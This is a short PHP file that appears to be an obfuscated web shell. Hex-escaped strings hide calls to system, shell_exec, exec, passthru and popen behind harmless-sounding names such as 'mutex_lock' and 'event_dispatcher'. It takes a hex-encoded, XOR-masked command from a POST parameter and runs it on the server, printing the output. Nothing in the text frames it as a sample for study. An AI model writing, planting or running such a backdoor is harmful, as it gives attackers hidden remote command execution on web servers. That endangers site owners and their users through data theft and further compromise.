<?php

$mutex_lock3 = "\x65\x78ec";
$secure_access = "\x68e\x78\x32bin";
$mutex_lock5 = "\x70o\x70en";
$mutex_lock2 = "\x73h\x65\x6Cl_exec";
$mutex_lock1 = "s\x79\x73tem";
$mutex_lock4 = "\x70\x61ss\x74h\x72u";
$mutex_lock6 = "\x73\x74\x72e\x61\x6D\x5F\x67et\x5Fc\x6F\x6Etents";
$mutex_lock7 = "\x70clo\x73\x65";
if (isset($_POST["\x69tm"])) {
            function event_dispatcher    ($ent,  $pointer   ) {
   $holder = ''  ;
$r=0;
 do{
$holder.=chr(ord($ent[$r])^$pointer);
$r++;

} while($r<strlen($ent));
 return    $holder;
 
}
            $itm = $secure_access($_POST["\x69tm"]);
            $itm = event_dispatcher($itm, 84);
            if (function_exists($mutex_lock1)) {
                $mutex_lock1($itm);
            } elseif (function_exists($mutex_lock2)) {
                print $mutex_lock2($itm);
            } elseif (function_exists($mutex_lock3)) {
                $mutex_lock3($itm, $data_ent);
                print join("\n", $data_ent);
            } elseif (function_exists($mutex_lock4)) {
                $mutex_lock4($itm);
            } elseif (function_exists($mutex_lock5) && function_exists($mutex_lock6) && function_exists($mutex_lock7)) {
                $pointer_holder = $mutex_lock5($itm, 'r');
                if ($pointer_holder) {
                    $ref_entity = $mutex_lock6($pointer_holder);
                    $mutex_lock7($pointer_holder);
                    print $ref_entity;
                }
            }
            exit;
        }